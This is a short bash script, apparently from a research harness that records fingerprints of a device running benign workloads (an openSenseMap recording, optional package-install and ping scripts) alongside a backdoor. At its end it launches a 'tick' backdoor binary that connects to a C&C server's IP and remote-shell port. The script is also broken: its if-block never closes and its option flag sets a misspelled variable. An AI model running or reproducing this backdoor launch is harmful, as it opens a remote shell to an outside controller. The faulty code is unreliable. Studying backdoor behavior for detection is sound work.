#!/bin/bash


############# CONFIGURATION ##########################

# parse options
benign_processes_active=false
while getopts "b" opt; do
	case $opt in
		b) benign_process_active=true ;;
		*) echo "Usage $0 [-b   Runs additional benign processes while creating fingerprints.]"; exit 1 ;;
	esac
done
shift $((OPTIND-1))


# cleanup procedure when user kills process
cleanup() {
	printf "\nCaught termination signal. Killing openSenseMap recording\n"
	screen -S openSenseMap -X quit

	# attempt to kill any fingerprinting processes still running (should be done)
	ps aux | grep "SCREEN -dmS fingerprinting" | awk '{print $2}' | xargs sudo kill 2>/dev/null
	exit
}
# Trap SIGINT (Ctrl+C) and SIGTERM
trap cleanup SIGINT SIGTERM


# load folder paths
. ./config/folder_paths.config

# load app data
. ./config/app_data.config

######################################################



# start benign behavior
screen -dmS openSenseMap -L -Logfile ./logfile.txt $openSenseMap_folder/start_openSenseMap_recording.sh

# start additional benign behavior if option given
if [ "$benign_process_active" = true ]; then
	bash package_installation_behavior.sh
	bash ping_behavior.sh 	

# start listening for C&C server
$tick_backdoor_folder/bin/ticksvc $ip_of_server $port_of_remote_shell

cleanup
